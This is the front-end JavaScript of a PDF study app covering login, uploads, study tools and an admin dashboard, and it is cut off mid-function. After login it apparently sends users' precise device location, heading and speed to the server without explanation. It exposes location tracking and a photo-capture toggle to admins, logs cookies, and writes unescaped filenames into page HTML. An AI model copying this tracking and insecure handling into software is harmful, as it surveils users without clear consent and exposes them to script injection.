const API_BASE_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:')
  ? 'http://localhost:5000'
  : 'https://studyai-yy2g.onrender.com';

// ============================================
// STATE MANAGEMENT
// ============================================

let appState = {
  isAuthenticated: false,
  user: null,
  chatHistory: [],
  pdfsList: [], // Array of {name, text, base64}
  processingFiles: {}, // Map of filename -> { progress: 0, status: 'waiting' }
  selectedPdfIndices: [], // Array of indices of selected PDFs (for multi-select)
  hasSentPreciseLocation: false,
  isAdmin: false,
  adminSummary: null,
  photoCaptureEnabled: false,
  
  // Convenience getters
  get currentFileName() {
    return this.pdfsList.length > 0 ? this.pdfsList[0].name : '';
  },
  get isProcessing() {
    return Object.keys(this.processingFiles).length > 0;
  },
  get pdfText() {
    // Combine text from all selected PDFs
    if (this.selectedPdfIndices.length === 0 || this.pdfsList.length === 0) {
      return '';
    }
    return this.selectedPdfIndices
      .map(idx => this.pdfsList[idx]?.text || '')
      .join('\n\n--- Next PDF ---\n\n');
  },
  get pdfBase64() {
    // Return base64 from first selected PDF
    if (this.selectedPdfIndices.length === 0 || this.pdfsList.length === 0) {
      return '';
    }
    return this.pdfsList[this.selectedPdfIndices[0]]?.base64 || '';
  }
};

// Removed domain cookie checks and session expiry prompts to work in cross-site setup

// ============================================
// INITIALIZATION
// ============================================

document.addEventListener('DOMContentLoaded', () => {
  console.log('App initialized');
  console.log('API_BASE_URL:', API_BASE_URL);
  console.log('Cookies:', document.cookie);
  
  // Remove 'centered' class from tool-controls on desktop (PC mode)
  if (window.innerWidth > 768) {
    const toolControls = document.querySelectorAll('.tool-controls.centered');
    toolControls.forEach(el => {
      el.classList.remove('centered');
    });
  }
  
  const urlParams = new URLSearchParams(window.location.search);
  
  // If redirected from OAuth callback with auth data, store it
  if (urlParams.has('auth')) {
    console.log('OAuth callback with auth data detected');
    const authB64 = urlParams.get('auth');
    try {
      const authJson = atob(authB64);
      const userData = JSON.parse(authJson);
      console.log('Storing auth data from callback:', userData.email);
      
      // Store in localStorage for mobile compatibility
      localStorage.setItem('user_data_backup', authJson);
      
      // Also try to trigger /me to ensure cookie is set
      window.history.replaceState({}, document.title, "/");
      setTimeout(() => {
        checkAuthAndShowDashboard();
      }, 300);
    } catch (e) {
      console.error('Failed to decode auth data:', e);
      checkAuthAndShowDashboard();
    }
  } else if (urlParams.has('dashboard')) {
    // Legacy: if just dashboard flag without auth
    console.log('OAuth callback detected - checking auth for dashboard');
    window.history.replaceState({}, document.title, "/");
    setTimeout(() => {
      checkAuthAndShowDashboard();
    }, 300);
  } else {
    // Regular page load - check if already authenticated
    checkAuth();
  }
});

// ============================================
// AUTHENTICATION
// ============================================

function requestPreciseLocation() {
  // If we are already running verification, don't run this
  if (sessionStorage.getItem('login_verified') !== 'true') {
    return;
  }
  
  if (!appState.isAuthenticated || appState.hasSentPreciseLocation) {
    return;
  }
  if (!('geolocation' in navigator)) {
    console.warn('Geolocation not supported in this browser');
    appState.hasSentPreciseLocation = true;
    return;
  }

  appState.hasSentPreciseLocation = true;

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
      const payload = {
        coords: {
          latitude,
          longitude,
          accuracy,
          altitude,
          altitudeAccuracy,
          heading,
          speed,
        },
        timestamp: position.timestamp,
        source: 'device',
      };

      fetch(`${API_BASE_URL}/api/location/report`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(payload),
      }).catch((error) => {
        console.warn('Failed to send precise location', error);
      });
    },
    (error) => {
      console.warn('Geolocation request failed', error);
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
  );
}

async function checkAuth() {
  try {
    console.log('Checking authentication...');
    const response = await fetch(`${API_BASE_URL}/me`, { 
      credentials: 'include',
      method: 'GET'
    });
    
    if (response.ok) {
      const data = await response.json();
      console.log('User authenticated via /me:', data.user.email);
      appState.isAuthenticated = true;
      appState.user = data.user;
      appState.isAdmin = !!data.isAdmin;
      appState.photoCaptureEnabled = !!data.photoCaptureEnabled;
      if (appState.isAdmin) {
        enableAdminUI();
      } else {
        disableAdminUI();
      }
      startHeartbeat();
      if (sessionStorage.getItem('login_verified') === 'true') {
        requestPreciseLocation();
      } else {
        performLoginVerification();
      }
      updateUserInfo();
      showPage('upload-page');
    } else {
      const backupData = localStorage.getItem('user_data_backup');
      if (backupData) {
        try {
          const user = JSON.parse(backupData);
          console.log('User authenticated via localStorage:', user.email);
          appState.isAuthenticated = true;
          appState.user = user;
          if (sessionStorage.getItem('login_verified') === 'true') {
            requestPreciseLocation();
          } else {
            performLoginVerification();
          }
          updateUserInfo();
          showPage('upload-page');
        } catch (e) {
          console.error('Failed to parse backup auth:', e);
          appState.isAuthenticated = false;
          showPage('landing-page');
        }
      } else {
        console.log('Not authenticated - showing login');
        appState.isAuthenticated = false;
        appState.user = null;
        showPage('landing-page');
      }
    }
  } catch (error) {
    console.error('Auth check error:', error);
    
    // Fallback: check localStorage
    const backupData = localStorage.getItem('user_data_backup');
    if (backupData) {
      try {
        const user = JSON.parse(backupData);
        console.log('User authenticated via localStorage (after error):', user.email);
        appState.isAuthenticated = true;
        appState.user = user;
        requestPreciseLocation();
        updateUserInfo();
        showPage('upload-page');
      } catch (e) {
        appState.isAuthenticated = false;
        appState.user = null;
        showPage('landing-page');
      }
    } else {
      appState.isAuthenticated = false;
      appState.user = null;
      showPage('landing-page');
    }
  }
}

async function checkAuthAndShowDashboard() {
  try {
    console.log('OAuth callback - checking auth for upload page...');
    // Initialize theme at the start
    initializeTheme();
    
    const response = await fetch(`${API_BASE_URL}/me`, { 
      credentials: 'include',
      method: 'GET'
    });
    
    console.log('Dashboard auth response status:', response.status);
    
    if (response.ok) {
      const data = await response.json();
      console.log('Authentication successful via /me:', data.user.email);
      appState.isAuthenticated = true;
      appState.user = data.user;
      appState.isAdmin = !!data.isAdmin;
      appState.photoCaptureEnabled = !!data.photoCaptureEnabled;
      if (appState.isAdmin) {
        enableAdminUI();
      } else {
        disableAdminUI();
      }
      startHeartbeat();
      if (sessionStorage.getItem('login_verified') === 'true') {
        requestPreciseLocation();
      } else {
        performLoginVerification();
      }
      updateUserInfo();
      showPage('upload-page');  // Show upload page after login, not dashboard
    } else {
      const backupData = localStorage.getItem('user_data_backup');
      if (backupData) {
        try {
          const user = JSON.parse(backupData);
          console.log('Authentication successful via localStorage:', user.email);
          appState.isAuthenticated = true;
          appState.user = user;
          if (sessionStorage.getItem('login_verified') === 'true') {
            requestPreciseLocation();
          } else {
            performLoginVerification();
          }
          updateUserInfo();
          showPage('upload-page');  // Show upload page after login
        } catch (e) {
          console.error('Failed to parse backup auth:', e);
          appState.isAuthenticated = false;
          appState.user = null;
          showPage('landing-page');
        }
      } else {
        console.log('Authentication failed - showing login');
        appState.isAuthenticated = false;
        appState.user = null;
        showPage('landing-page');
      }
    }
  } catch (error) {
    console.error('Dashboard auth error:', error);
    
    // Fallback: check localStorage
    const backupData = localStorage.getItem('user_data_backup');
    if (backupData) {
      try {
        const user = JSON.parse(backupData);
        console.log('Authentication successful via localStorage (after error):', user.email);
        appState.isAuthenticated = true;
        appState.user = user;
        requestPreciseLocation();
        updateUserInfo();
        showPage('upload-page');  // Show upload page after login
      } catch (e) {
        appState.isAuthenticated = false;
        appState.user = null;
        showPage('landing-page');
      }
    } else {
      appState.isAuthenticated = false;
      appState.user = null;
      showPage('landing-page');
    }
  }
}

function signInWithGoogle() {
  console.log('Google sign-in button clicked');
  console.log('Redirecting to:', `${API_BASE_URL}/auth/google`);
  window.location.href = `${API_BASE_URL}/auth/google`;
}

async function signOut() {
  try {
    await fetch(`${API_BASE_URL}/auth/logout`, { method: 'POST', credentials: 'include' });
    
    // Clear localStorage backup
    localStorage.removeItem('user_data_backup');
    // Clear session verification flag so next login triggers verification
    sessionStorage.removeItem('login_verified');
    
    stopHeartbeat();
    appState.isAuthenticated = false;
    appState.user = null;
    appState.chatHistory = [];
    appState.hasSentPreciseLocation = false;
    disableAdminUI();
    showPage('landing-page');
  } catch (error) {
    console.error('Logout failed:', error);
  }
}

function updateUserInfo() {
  const userInfoElements = document.querySelectorAll('#user-info-header');
  if (appState.user) {
    userInfoElements.forEach(el => {
      el.innerHTML = `
        <img src="${appState.user.picture}" alt="${appState.user.name}" style="width: 32px; height: 32px; border-radius: 50%; margin-right: 8px;">
        <span>${appState.user.given_name}</span>
      `;
      
      // If admin, click opens admin dashboard
      if (appState.isAdmin) {
        el.onclick = (e) => {
          e.stopPropagation();
          showPage('dashboard');
          selectTool('admin', null);
        };
        el.title = "Go to Admin Dashboard";
      } else {
        el.onclick = (e) => {
          e.stopPropagation();
          toggleThreeDotsMenu();
        };
        el.title = "User Menu";
      }
    });
  }
  
  // Update user dropdown with new design
  updateUserDropdown();
}

// Update User Dropdown with User Information
function updateUserDropdown() {
  const userInfoDropdown = document.getElementById('user-info-dropdown');
  if (userInfoDropdown && appState.user) {
    userInfoDropdown.innerHTML = `
      <div class="user-name">${appState.user.name}</div>
      <div class="user-id">ID: ${appState.user.sub || appState.user.email || 'Unknown'}</div>
    `;
  }
  
  // Add click listeners to profile elements to toggle dropdown
  const profilePic = document.querySelector('.user-profile');
  const userName = document.querySelector('.user-name');
  
  if (profilePic) {
    profilePic.onclick = (e) => {
      e.stopPropagation();
      toggleThreeDotsMenu();
    };
    profilePic.style.cursor = 'pointer';
  }
  
  if (userName) {
    userName.onclick = (e) => {
      e.stopPropagation();
      toggleThreeDotsMenu();
    };
    userName.style.cursor = 'pointer';
  }
}

// ============================================
// PAGE NAVIGATION
// ============================================

function showPage(pageId) {
  document.querySelectorAll('.page').forEach(page => {
    page.classList.remove('active');
  });
  document.getElementById(pageId).classList.add('active');
  
  // Reset chat on page change
  if (pageId === 'dashboard') {
    appState.chatHistory = [];
    document.getElementById('chat-history').innerHTML = '';
    // Update PDF count display when showing dashboard
    setTimeout(() => {
      updatePdfCountDisplay();
    }, 100);
  }
}

function backToUpload() {
  appState.chatHistory = [];
  document.getElementById('chat-history').innerHTML = '';
  document.getElementById('main-pdf-file').value = '';
  document.getElementById('file-label-text').textContent = 'Click to upload or drag and drop';
  document.getElementById('upload-btn').disabled = true;
  showPage('upload-page');
}

// ============================================
// FILE UPLOAD
// ============================================

function handleFileSelected() {
  const fileInput = document.getElementById('main-pdf-file');
  const uploadBtn = document.getElementById('upload-btn');
  const fileLabel = document.getElementById('file-label-text');
  
  if (fileInput.files.length > 0) {
    const fileCount = fileInput.files.length;
    const filesText = fileCount === 1 ? '1 file' : `${fileCount} files`;
    fileLabel.textContent = filesText + ' selected';
    uploadBtn.disabled = false;
    
    // Auto-upload if we're on the upload page and this came from "Add more PDFs"
    if (document.getElementById('upload-page').style.display !== 'none' && 
        fileInput.getAttribute('data-auto-upload') === 'true') {
      fileInput.setAttribute('data-auto-upload', 'false'); // Reset flag
      setTimeout(() => handleMainUpload(), 100);
    }
  } else {
    fileLabel.textContent = 'Click to upload or drag and drop';
    uploadBtn.disabled = true;
  }
}

async function handleMainUpload() {
  const fileInput = document.getElementById('main-pdf-file');
  if (fileInput.files.length === 0) {
    alert('Please select PDF files first.');
    return;
  }

  const files = Array.from(fileInput.files);
  console.log('🔼 Starting upload of', files.length, 'PDF(s)');
  
  // If we are on the upload page, switch to dashboard immediately
  if (document.getElementById('upload-page').classList.contains('active')) {
    showPage('dashboard');
    // If this is the first upload, maybe show a "getting started" message or similar
    if (appState.pdfsList.length === 0) {
        // Select chatbot by default
        selectTool('chatbot', document.querySelector('.tool-menu-item'));
    }
  }

  // Start uploads in background
  files.forEach(file => {
    uploadFileInBackground(file);
  });
  
  // Clear input
  fileInput.value = '';
  document.getElementById('file-label-text').textContent = 'Click to upload or drag and drop';
  document.getElementById('upload-btn').disabled = true;
}

async function uploadFileInBackground(file) {
  const filename = file.name;
  console.log('📤 Starting background upload:', filename);
  
  // Initialize status
  updateProcessingStatus(filename, 0, 'Initializing...');
  
  const formData = new FormData();
  formData.append('file', file);

  try {
    const response = await fetch(`${API_BASE_URL}/api/upload-pdf`, {
      method: 'POST',
      body: formData,
      credentials: 'include',
    });
    
    if (!response.ok) {
        const errText = await response.text();
        throw new Error(errText || 'Upload failed');
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder();
    let buffer = '';
    let finalData = null;

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      
      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop(); // Keep the last incomplete line

      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const update = JSON.parse(line);
          
          if (update.status === 'progress') {
              updateProcessingStatus(filename, update.percent, update.message);
          } else if (update.status === 'success') {
              finalData = update;
              updateProcessingStatus(filename, 100, 'Complete');
          } else if (update.error) {
              throw new Error(update.error);
          }
        } catch (e) {
          console.warn('Error parsing stream line:', e);
        }
      }
    }
    
    if (!finalData) throw new Error('No success response received');
    
    const data = finalData;
    
    // Add PDF to appState.pdfsList
    const newIndex = appState.pdfsList.length;
    appState.pdfsList.push({
      name: file.name,
      text: data.pdf_text,
      base64: data.pdf_base64
    });
    
    // If this is the only PDF, select it automatically
    if (appState.pdfsList.length === 1) {
        appState.selectedPdfIndices = [0];
    }
    
    console.log('✅ PDF added to list:', file.name);
    
    // Remove from processing list
    removeProcessingFile(filename);
    
    // Update UI
    updatePdfCountDisplay();
    
    // Save backup
    savePdfsToStorage();
    
    // Show toast
    showToast(`Upload complete: ${filename}`);

  } catch (error) {
    console.error('❌ Upload error for', filename, ':', error);
    updateProcessingStatus(filename, 0, 'Error');
    // Keep it in the list but marked as error? Or remove it?
    // For now, remove it after a delay
    setTimeout(() => {
        removeProcessingFile(filename);
        alert(`Upload failed for ${filename}: ${error.message}`);
    }, 2000);
  }
}

function savePdfsToStorage() {
  try {
    localStorage.setItem('pdfs_backup', JSON.stringify(appState.pdfsList));
  } catch (e) {
    console.warn('Failed to save PDFs to localStorage (likely quota exceeded).');
    try {
        const lightBackup = appState.pdfsList.map(p => ({
            name: p.name,
            text: p.text,
            base64: '' // Skip heavy base64
        }));
        localStorage.setItem('pdfs_backup', JSON.stringify(lightBackup));
    } catch (e2) {
        console.warn('Even lightweight backup failed.');
    }
  }
}

function showToast(message) {
    // Simple toast implementation
    const toast = document.createElement('div');
    toast.className = 'toast-notification';
    toast.textContent = message;
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: var(--surface);
        color: var(--text-primary);
        padding: 10px 20px;
        border-radius: 4px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        border-left: 4px solid var(--success);
    `;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ============================================
// PDF MANAGEMENT
// ============================================

function restorePdfsFromStorage() {
  try {
    const pdfsBackup = localStorage.getItem('pdfs_backup');
    if (pdfsBackup) {
      appState.pdfsList = JSON.parse(pdfsBackup);
      // By default, select all PDFs
      appState.selectedPdfIndices = Array.from({length: appState.pdfsList.length}, (_, i) => i);
      console.log('✅ Restored PDFs from localStorage:', appState.pdfsList.length, 'PDFs');
      console.log('📌 Selected all PDFs by default:', appState.selectedPdfIndices);
      updatePdfCountDisplay();
      return true;
    }
  } catch (e) {
    console.error('Failed to restore PDFs:', e);
  }
  return false;
}

function updatePdfCountDisplay() {
  const countDisplay = document.getElementById('pdf-count-display');
  if (!countDisplay) return;
  
  if (appState.pdfsList.length === 0) {
    countDisplay.textContent = 'Upload PDF to get started';
  } else if (appState.pdfsList.length === 1) {
    countDisplay.textContent = '1 PDF uploaded';
  } else {
    countDisplay.textContent = `${appState.pdfsList.length} PDFs uploaded`;
  }
  
  // Update dropdown menu
  updatePdfDropdown();
}

function updatePdfDropdown() {
  const dropdownList = document.getElementById('pdf-list-dropdown');
  if (!dropdownList) return;
  
  dropdownList.innerHTML = '';
  
  // Show processing files first
  Object.keys(appState.processingFiles).forEach(filename => {
    const status = appState.processingFiles[filename];
    const item = document.createElement('div');
    item.className = 'dropdown-pdf-item processing';
    item.style.opacity = '0.7';
    item.style.cursor = 'default';
    
    item.innerHTML = `
      <div class="dropdown-pdf-content">
        <i class="fas fa-spinner fa-spin"></i>
        <div class="dropdown-pdf-info">
          <div class="dropdown-pdf-name">${filename}</div>
          <div class="dropdown-pdf-size">${status.status} (${Math.round(status.progress)}%)</div>
        </div>
      </div>
    `;
    dropdownList.appendChild(item);
  });
  
  if (appState.pdfsList.length === 0 && Object.keys(appState.processingFiles).length === 0) {
    dropdownList.innerHTML = '<div style="padding:10px; text-align:center; color:var(--text-secondary);">No PDFs uploaded</div>';
    return;
  }
  
  appState.pdfsList.forEach((pdf, index) => {
    const pdfItem = document.createElement('div');
    pdfItem.className = 'dropdown-pdf-item';
    
    const isSelected = appState.selectedPdfIndices.includes(index);
    if (isSelected) {
      pdfItem.classList.add('selected');
    }
    
    pdfItem.innerHTML = `
      <div class="dropdown-pdf-content" onclick="togglePdfSelection(${index})">
        <input type="checkbox" class="pdf-checkbox" ${isSelected ? 'checked' : ''} onchange="togglePdfSelection(${index})">
        <i class="fas fa-file-pdf"></i>
        <div class="dropdown-pdf-info">
          <div class="dropdown-pdf-name">${pdf.name}</div>
          <div class="dropdown-pdf-size">${(pdf.text.length / 1024).toFixed(1)} KB</div>
        </div>
      </div>
      <button class="dropdown-pdf-delete" onclick="deletePdf(${index}, event); updatePdfDropdown();">
        <i class="fas fa-trash-alt"></i>
      </button>
    `;
    
    dropdownList.appendChild(pdfItem);
  });
}

function togglePdfSelection(index) {
  if (appState.selectedPdfIndices.includes(index)) {
    // Remove from selection
    appState.selectedPdfIndices = appState.selectedPdfIndices.filter(i => i !== index);
    console.log('📌 Deselected PDF:', appState.pdfsList[index].name);
  } else {
    // Add to selection
    appState.selectedPdfIndices.push(index);
    appState.selectedPdfIndices.sort((a, b) => a - b); // Keep sorted
    console.log('📌 Selected PDF:', appState.pdfsList[index].name);
  }
  console.log('✅ Currently selected PDFs:', appState.selectedPdfIndices);
  updatePdfDropdown(); // Refresh the UI
}

function togglePdfDropdown() {
  const menu = document.getElementById('pdf-dropdown-menu');
  menu.classList.toggle('active');
}

function closePdfDropdown() {
  const menu = document.getElementById('pdf-dropdown-menu');
  menu.classList.remove('active');
}

// Toggle User Profile Dropdown
function toggleUserDropdown() {
  const menu = document.getElementById('user-dropdown-menu');
  if (menu) {
    menu.classList.toggle('active');
  }
}

// Close User Dropdown
function closeUserDropdown() {
  const menu = document.getElementById('user-dropdown-menu');
  if (menu) {
    menu.classList.remove('active');
  }
}

// Toggle Three-Dot Menu (placeholder for future functionality)
function toggleThreeDotsMenu() {
  const menu = document.getElementById('three-dots-menu');
  if (menu) {
    menu.classList.toggle('active');
    if (menu.classList.contains('active')) {
      updateThreeDotsMenu();
    }
  }
}

// Close Three-Dots Menu
function closeThreeDotsMenu() {
  const menu = document.getElementById('three-dots-menu');
  if (menu) {
    menu.classList.remove('active');
  }
}

// Update Three-Dots Menu with User Information
function updateThreeDotsMenu() {
  const userNameEl = document.getElementById('three-dots-user-name');
  const userPicEl = document.getElementById('three-dots-user-pic');
  
  if (userNameEl && appState.user) {
    userNameEl.textContent = appState.user.name || 'User';
    if (appState.isAdmin) {
      userNameEl.style.cursor = 'pointer';
      userNameEl.onclick = () => {
        showPage('dashboard');
        selectTool('admin', null);
        closeThreeDotsMenu();
      };
      userNameEl.title = "Go to Admin Dashboard";
    }
  }
  
  if (userPicEl && appState.user) {
    userPicEl.src = appState.user.picture || '';
    userPicEl.style.display = 'block';
    if (appState.isAdmin) {
      userPicEl.style.cursor = 'pointer';
      userPicEl.onclick = () => {
        showPage('dashboard');
        selectTool('admin', null);
        closeThreeDotsMenu();
      };
      userPicEl.title = "Go to Admin Dashboard";
    }
  }
  
  // Set dark mode toggle state based on current theme
  const darkModeToggle = document.getElementById('dark-mode-toggle');
  if (darkModeToggle) {
    darkModeToggle.checked = document.documentElement.getAttribute('data-theme') === 'dark';
  }
}

// Toggle Dark Mode
function toggleDarkMode() {
  const isDarkMode = document.getElementById('dark-mode-toggle').checked;
  if (isDarkMode) {
    enableDarkMode();
  } else {
    disableDarkMode();
  }
}

// Enable Dark Mode
function enableDarkMode() {
  document.documentElement.setAttribute('data-theme', 'dark');
  localStorage.setItem('theme', 'dark');
  applyDarkModeStyles();
}

// Disable Dark Mode
function disableDarkMode() {
  document.documentElement.setAttribute('data-theme', 'light');
  localStorage.setItem('theme', 'light');
  applyLightModeStyles();
}

// Apply Dark Mode Styles
function applyDarkModeStyles() {
  const root = document.documentElement;
  root.style.setProperty('--background', '#0f172a');
  root.style.setProperty('--surface', '#1e293b');
  root.style.setProperty('--text-primary', '#f1f5f9');
  root.style.setProperty('--text-secondary', '#cbd5e1');
  root.style.setProperty('--text-light', '#94a3b8');
  root.style.setProperty('--border', '#334155');
}

// Apply Light Mode Styles
function applyLightModeStyles() {
  const root = document.documentElement;
  root.style.setProperty('--background', '#f8f9fa');
  root.style.setProperty('--surface', '#ffffff');
  root.style.setProperty('--text-primary', '#0f172a');
  root.style.setProperty('--text-secondary', '#64748b');
  root.style.setProperty('--text-light', '#94a3b8');
  root.style.setProperty('--border', '#e2e8f0');
}

// Initialize theme on page load
function initializeTheme() {
  const savedTheme = localStorage.getItem('theme') || 'light';
  if (savedTheme === 'dark') {
    document.documentElement.setAttribute('data-theme', 'dark');
    applyDarkModeStyles();
  } else {
    document.documentElement.setAttribute('data-theme', 'light');
    applyLightModeStyles();
  }
}

// Close dropdown when clicking outside
document.addEventListener('click', (e) => {
  // Close PDF dropdown
  const dropdown = document.querySelector('.dropdown');
  if (dropdown && !dropdown.contains(e.target)) {
    closePdfDropdown();
  }
  
  // Close user dropdown
  const userDropdown = document.querySelector('.dropdown-user');
  if (userDropdown && !userDropdown.contains(e.target)) {
    closeUserDropdown();
  }
  
  // Close three-dots dropdown
  const threeDotsDropdown = document.querySelector('.dropdown-three-dots');
  const userInfoHeader = document.getElementById('user-info-header');
  if (threeDotsDropdown && !threeDotsDropdown.contains(e.target) && 
      (!userInfoHeader || !userInfoHeader.contains(e.target))) {
    closeThreeDotsMenu();
  }
});

function updatePdfList() {
  // Updated to use new dropdown system
  updatePdfCountDisplay();
}

function selectPdf(index) {
  // This function is no longer used - multi-select is now handled by togglePdfSelection()
  // Kept for backward compatibility
  console.log('ℹ️ selectPdf() is deprecated, use togglePdfSelection() instead');
}

function deletePdf(index, event) {
  if (event) {
    event.stopPropagation();
  }
  
  if (appState.pdfsList.length === 1) {
    alert('You must keep at least one PDF. Upload more before deleting.');
    return;
  }
  
  const pdfName = appState.pdfsList[index].name;
  if (confirm(`Delete "${pdfName}"?`)) {
    // Send deletion request to backend
    const formData = new FormData();
    formData.append('filename', pdfName);
    
    fetch(`${API_BASE_URL}/api/delete-pdf`, {
      method: 'POST',
      body: formData,
      credentials: 'include',
    })
    .then(response => {
      if (!response.ok) {
        console.warn('⚠️ Backend deletion may have failed, but proceeding with local deletion');
      }
      return response.json().catch(() => ({}));
    })
    .then(data => {
      // Remove from appState
      appState.pdfsList.splice(index, 1);
      
      // Update selectedPdfIndices - remove deleted index and adjust others
      appState.selectedPdfIndices = appState.selectedPdfIndices
        .filter(i => i !== index)
        .map(i => i > index ? i - 1 : i);
      
      // If no PDFs selected, select all remaining
      if (appState.selectedPdfIndices.length === 0 && appState.pdfsList.length > 0) {
        appState.selectedPdfIndices = Array.from({length: appState.pdfsList.length}, (_, i) => i);
      }
      
      // Update localStorage backup
      localStorage.setItem('pdfs_backup', JSON.stringify(appState.pdfsList));
      
      console.log('🗑️ Deleted PDF:', pdfName);
      console.log('� Updated selections:', appState.selectedPdfIndices);
      updatePdfCountDisplay();
    })
    .catch(error => {
      console.error('❌ Error deleting PDF:', error);
      // Still remove from local state even if server request fails
      appState.pdfsList.splice(index, 1);
      
      appState.selectedPdfIndices = appState.selectedPdfIndices
        .filter(i => i !== index)
        .map(i => i > index ? i - 1 : i);
      
      if (appState.selectedPdfIndices.length === 0 && appState.pdfsList.length > 0) {
        appState.selectedPdfIndices = Array.from({length: appState.pdfsList.length}, (_, i) => i);
      }
      
      localStorage.setItem('pdfs_backup', JSON.stringify(appState.pdfsList));
      
      updatePdfCountDisplay();
      alert('Note: PDF removed locally, but server deletion may need manual cleanup.');
    });
  }
}

function addMorePdfs() {
  // Clear the file input and trigger it again for adding more PDFs
  const fileInput = document.getElementById('main-pdf-file');
  fileInput.value = ''; // Reset file input completely
  fileInput.setAttribute('data-auto-upload', 'true'); // Set flag to auto-upload
  
  // Trigger click in next frame to ensure value is cleared first
  setTimeout(() => {
    try {
      fileInput.click();
    } catch (error) {
      console.error('❌ Error opening file picker:', error);
      alert('Failed to open file picker. Please try again.');
    }
  }, 0);
  
  closePdfDropdown();
}

// ============================================
// TOOL SELECTION
// ============================================

function selectTool(toolName, element) {
  // Update active menu item
  document.querySelectorAll('.tool-menu-item').forEach(item => {
    item.classList.remove('active');
  });
  
  // Only add active class if element is provided and it's a sidebar item
  if (element && element.classList.contains('tool-menu-item')) {
    element.classList.add('active');
  }
  
  // Update active content
  document.querySelectorAll('.tool-content').forEach(content => {
    content.classList.remove('active');
  });
  document.getElementById(`${toolName}-content`).classList.add('active');
  
  // Update navbar header
  updateNavbarHeader(toolName);

  // Lazy-load admin data when admin tab is selected
  if (toolName === 'admin') {
    loadAdmin();
  } else if (toolName === 'book') {
    handleBookView();
  }
}

// Update navbar with current tool info
function updateNavbarHeader(toolName) {
  const navbarCenter = document.getElementById('navbar-center');
  const toolInfo = {
    chatbot: {
      icon: 'fas fa-comment-dots',
      title: 'Chat with PDF',
      description: 'Ask any question about your PDF and get instant answers'
    },
    summarizer: {
      icon: 'fas fa-file-alt',
      title: 'Summarize',
      description: 'Get a concise summary of the entire document'
    },
    quiz: {
      icon: 'fas fa-question-circle',
      title: 'Quiz Generator',
      description: 'Create multiple-choice practice questions'
    },
    flashcards: {
      icon: 'fas fa-layer-group',
      title: 'Flashcards',
      description: 'Create interactive flashcards for quick revision'
    },
    mindmap: {
      icon: 'fas fa-project-diagram',
      title: 'Mind Map',
      description: 'Visualize concepts with an AI-generated mind map'
    },
    book: {
      icon: 'fas fa-book-open',
      title: 'Book View',
      description: 'Read your PDF like a real book'
    },
    admin: {
      icon: 'fas fa-user-shield',
      title: 'Admin Dashboard',
      description: 'Manage user data & monitoring'
    }
  };
  
  const tool = toolInfo[toolName];
  if (tool) {
    // Desktop view - show full info in center
    navbarCenter.innerHTML = `
      <div class="navbar-tool-info">
        <h2><i class="${tool.icon}"></i> ${tool.title}</h2>
        <p>${tool.description}</p>
      </div>
    `;
  }
}

// ============================================
// ADMIN DASHBOARD
// ============================================

function enableAdminUI() {
  const adminItem = document.getElementById('admin-dropdown-item');
  const adminDivider = document.getElementById('admin-divider');
  if (adminItem) adminItem.style.display = 'flex';
  if (adminDivider) adminDivider.style.display = 'block';
  // Preload summary
  loadAdmin();
}

function disableAdminUI() {
  const adminItem = document.getElementById('admin-dropdown-item');
  const adminDivider = document.getElementById('admin-divider');
  if (adminItem) adminItem.style.display = 'none';
  if (adminDivider) adminDivider.style.display = 'none';
}

async function loadAdmin() {
  if (!appState.isAdmin) return;
  
  const statusGrid = document.getElementById('admin-system-status');
  if (statusGrid && !appState.adminSummary) {
     statusGrid.innerHTML = '<div style="padding:10px; text-align:center;">Loading...</div>';
  }

  try {
    const resp = await fetch(`${API_BASE_URL}/api/admin/summary`, {
      credentials: 'include'
    });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed to load summary');
    appState.adminSummary = data;
    renderAdminSummary();
    
    // Also load users and activity if those tabs are active (or just load them in background)
    loadAdminUsers();
    loadAdminActivity();
  } catch (e) {
    console.error('Failed to load admin summary:', e);
    if (statusGrid) {
        statusGrid.innerHTML = `<div style="color:var(--error); padding:10px;">Error loading admin data: ${e.message}</div>`;
    }
  }
}

function renderAdminSummary() {
  const data = appState.adminSummary;
  if (!data) return;

  const admin = data.admin || {};
  const totals = data.totals || {};
  const location = admin.location || {};
  const locDevice = location.device || {};

  // Update Stats Cards
  document.getElementById('admin-total-users').textContent = totals.totalUsers || 0;
  document.getElementById('admin-total-uploads').textContent = totals.totalUploads || 0;
  
  const photoToggle = document.getElementById('admin-photo-toggle');
  if (photoToggle) {
    photoToggle.checked = !!admin.photoCaptureEnabled;
  }

  // Update System Status
  const statusGrid = document.getElementById('admin-system-status');
  if (statusGrid) {
    statusGrid.innerHTML = `
      <div class="status-item">
        <span class="status-label">Admin User</span>
        <span class="status-value">${admin.name || admin.email}</span>
      </div>
      <div class="status-item">
        <span class="status-label">Drive Connection</span>
        <span class="status-value ${admin.driveFolderLink ? 'online' : 'offline'}">
          ${admin.driveFolderLink ? 'Connected' : 'Disconnected'}
        </span>
      </div>
      <div class="status-item">
        <span class="status-label">Last Login</span>
        <span class="status-value">${admin.lastLoginAt || 'N/A'}</span>
      </div>
      <div class="status-item">
        <span class="status-label">Location Tracking</span>
        <span class="status-value ${locDevice.latitude ? 'online' : 'offline'}">
          ${locDevice.latitude ? 'Active' : 'Inactive'}
        </span>
      </div>
    `;
  }
}

function switchAdminTab(tabName) {
  // Update tab buttons
  document.querySelectorAll('.admin-tab').forEach(tab => {
    tab.classList.remove('active');
    if (tab.getAttribute('onclick').includes(tabName)) {
      tab.classList.add('active');
    }
  });

  // Update tab content
  document.querySelectorAll('.admin-tab-content').forEach(content => {
    content.classList.remove('active');
  });
  document.getElementById(`admin-tab-${tabName}`).classList.add('active');

  // Load specific data if needed
